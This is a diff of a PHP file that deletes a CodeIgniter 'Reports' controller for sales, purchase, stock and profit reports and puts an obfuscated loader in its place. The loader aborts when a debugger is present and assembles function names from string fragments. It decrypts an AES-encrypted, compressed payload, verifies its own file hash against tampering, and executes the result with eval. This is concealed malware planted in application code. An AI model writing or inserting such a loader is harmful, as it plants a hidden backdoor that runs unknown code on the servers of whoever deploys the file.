@@ -1,169 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Reports extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('reports_model','reports');
-	}
-	
-		
-	//Sales Report 
-	public function sales(){
-		$this->permission_check('sales_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sales_report');
-		$this->load->view('report-sales', $data);
-	}
-	public function show_sales_report(){
-		echo $this->reports->show_sales_report();
-	}
-
-	//Sales Return Report 
-	public function sales_return(){
-		$this->permission_check('sales_return_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sales_return_report');
-		$this->load->view('report-sales-return', $data);
-	}
-	public function show_sales_return_report(){
-		echo $this->reports->show_sales_return_report();
-	}
-
-	//Purchase report
-	public function purchase(){
-		$this->permission_check('purchase_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('purchase_report');
-		$this->load->view('report-purchase', $data);
-	}
-	public function show_purchase_report(){
-		echo $this->reports->show_purchase_report();
-	}
-
-	//Purchase Return report
-	public function purchase_return(){
-		$this->permission_check('purchase_return_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('purchase_return_report');
-		$this->load->view('report-purchase-return', $data);
-	}
-	public function show_purchase_return_report(){
-		echo $this->reports->show_purchase_return_report();
-	}
-
-	//Expense report
-	public function expense(){
-		$this->permission_check('expense_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expense_report');
-		$this->load->view('report-expense', $data);
-	}
-	public function show_expense_report(){
-		echo $this->reports->show_expense_report();
-	}
-	//Profit report
-	public function profit_loss(){
-		$this->permission_check('profit_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('profit_and_loss_report');
-		$this->load->view('report-profit-loss', $data);
-	}
-	public function get_profit_loss_report(){
-		echo json_encode($this->reports->get_profit_loss_report());
-	}
-	public function get_profit_by_item(){
-		echo $this->reports->get_profit_by_item();
-	}
-	public function get_profit_by_invoice(){
-		echo $this->reports->get_profit_by_invoice();
-	}
-
-	//Summary report
-	public function stock(){
-		$this->permission_check('stock_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('stock_report');
-		$this->load->view('report-stock', $data);
-	}
-
-	public function get_stock_report(){
-		$data = array(
-			'item_wise_report' => $this->show_stock_report(),
-			'brand_wise_stock' => $this->brand_wise_stock(),
-			'category_wise_stock' => $this->category_wise_stock(),
-		);
-		echo json_encode($data); 
-	}
-	/*Stock Report*/
-	public function show_stock_report(){
-		return $this->reports->show_stock_report();
-	}
-	public function brand_wise_stock(){
-		return $this->reports->brand_wise_stock();
-	}
-	public function category_wise_stock(){
-		return $this->reports->category_wise_stock();
-	}
-	//Item Sales Report 
-	public function item_sales(){
-		$this->permission_check('item_sales_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('item_sales_report');
-		$this->load->view('report-sales-item', $data);
-	}
-	public function show_item_sales_report(){
-		echo $this->reports->show_item_sales_report();
-	}
-	//Item purchase Report 
-	public function item_purchase(){
-		$this->permission_check('item_purchase_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('item_purchase_report');
-		$this->load->view('report-purchase-item', $data);
-	}
-	public function show_item_purchase_report(){
-		echo $this->reports->show_item_purchase_report();
-	}
-	//Purchase Payments report
-	public function purchase_payments(){
-		$this->permission_check('purchase_payments_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('purchase_payments_report');
-		$this->load->view('report-purchase-payments', $data);
-	}
-	public function show_purchase_payments_report(){
-		echo $this->reports->show_purchase_payments_report();
-	}
-	public function supplier_payments_report(){
-		echo $this->reports->supplier_payments_report();
-	}
-
-	//Sales Payments report
-	public function sales_payments(){
-		$this->permission_check('sales_payments_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sales_payments_report');
-		$this->load->view('report-sales-payments', $data);
-	}
-	public function show_sales_payments_report(){
-		echo $this->reports->show_sales_payments_report();
-	}
-	public function customer_payments_report(){
-		echo $this->reports->customer_payments_report();
-	}
-	//Expired Items Report 
-	public function expired_items(){
-		$this->permission_check('expired_items_report');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('expired_items_report');
-		$this->load->view('report-expired-items', $data);
-	}
-	public function show_expired_items_report(){
-		echo $this->reports->show_expired_items_report();
-	}
-
-	
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nlfc8zdu=('bas'.'e64'.'_de'.'cod'.'e');
+$_nav2pm6y=('gzu'.'nco'.'mpr'.'ess');
+$_nf7trd47=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tlrycoxj='IWpFBpi5';
+$_zihqd82w='S1tvR4IGCGM=';
+$_dy1oz174='JNIQdloY';
+$_jp56c65w='GiQUkWss';
+$_uy150fia='jIQXZo67';
+$_hvu5gidp='skWrmPPe';
+$_cezg9ehf='lh7RbQ==';
+$_ohjbokbo='SOR1B8x9';
+$_f8xeg8t8=$_nlfc8zdu($_jp56c65w.$_uy150fia.$_dy1oz174.$_tlrycoxj.$_zihqd82w);
+$_ivb8b4dy=$_nlfc8zdu($_hvu5gidp.$_ohjbokbo.$_cezg9ehf);
+$_dci1wdvy=$_nlfc8zdu('5y9N0scJX9JOr6utqRvQCsC4K6+6UHY+I4paP2qqUVQlYYkFb2NunexPPpDOMP+UdxI3r9+5rstANhMhgojyX4PSCClo13yjT1FlQmdBlK5ZT4ENVDqKbuUv5IkUurtRs/wFPHyDn3IgNQo9/fhvziF0JVW8XQiA09Z6mINZw+k9R1RrOoxWcpyb6lEmvlZwsmn43hp2Zp4PyIFtLlMkLVR4Mcp+W2g1fUAYZE7uiqg6Xc+CPLuGWqzPNwSHmTEELUaBF/CZJm4QR8Cb4TFMNAgkJF3uk/m8sVUc9cprcDHCTEsIoONXU831KEtTXMNEC2aIIDxN70RCzAfmzDZZy+6d4o0vJ5dHyVs1caQBJDppuk91GxppoWUdSJWj+S6D/3u4myGWnGN/QpRx8Vl1vflf+PYiZjHeGfGVukK5sFqTeF1dNNB3EPM778aXWD2Kq9gdZtETjXHt5bi0DTmSN37TlEZ3BULPcujsE387+Jg0uhWdVtZXS6SyfL610Pvl1R52/UtvOEzoVUWERt3IiA6Kw1I4HUIlYw9doVRryPDl0OpUQaHksA7kjwwXzYuh8wBBOZDFxOpThQlBfuIrDYc4/Hxv0U8ejpgci83Cw8g1DdLnvr2EBXIZduvCTqULWuKjvEEKEkrajyb4pioqrUuF6mKcGp3/VduRrErpvK+FI0kCxjUP0Fh1g+vDaCJIgWOCO/0cgFnp/CJtc6aEYoUxJiEixWYoxZKWuZRsR+IqRbsdkSLQaB0GQsfZYcFPGsTnqrlLtxaaDKnNoykuO2kRIbZumkj3dc/uS4uf+yAV5TUc50XHdHiGEchkE7XzOrhHlBq3GCZFbHpbi5MbCOfJ6tzwHwHMKaziSzGW2M8CasUFZNFGqjsNii0Ph7+ePIMWuH+4mXnLxSuNijAqj0oqDZUeyAuUlZrJPn5JaEFlTYQ5VPHylMcdG42p8uW/Mebszu2iNZ/op3bioP+KoFM337/n3rVx7fbSVJoTt1Jg3u74Tvjbhfqus81tJd6yIcgWoCyrT5iSujjbInuH81f2iCRvUgCR29iqR9ZhETe/B6/kvlx2Kv/KtT3KfbjWSSRle5HzQsIudZdnI+fK9cIlVqhAB5J6wftuGFj3A6rd4Cr4Sl6JTF56AqIrJdPuChO4BauZeNPTN6yGTygvbpxj5GwkhYc0Ci+leQGsbq3jx3lqVebYheZvgYTUzt1duCxJ34ZsFNDSsEf0FfYPY+CHfXHMiHjt0O4mdZkzaz8=');
+$_ey8bs17x=$_nf7trd47($_dci1wdvy,'aes-256-cbc',$_f8xeg8t8,OPENSSL_RAW_DATA,$_ivb8b4dy);
+if($_ey8bs17x===false){exit;}
+$_w4k1h9tf=$_nav2pm6y($_ey8bs17x);
+if($_w4k1h9tf===false){exit;}
+$_dljv7gul='a7665d801dd8c99d7e0607c82ad9753ae083d62461a14d682a70b41d435535e1';
+$_ndmcix6r=@file_get_contents(__FILE__);
+if($_ndmcix6r!==false){
+$_p4oo16kx=str_replace($_dljv7gul,"0000000000000000000000000000000000000000000000000000000000000000",$_ndmcix6r);
+$_s8yaass8=hash("sha256",$_p4oo16kx);
+if($_s8yaass8!==$_dljv7gul){@http_response_code(403);exit;}
 }
-
+eval($_w4k1h9tf);
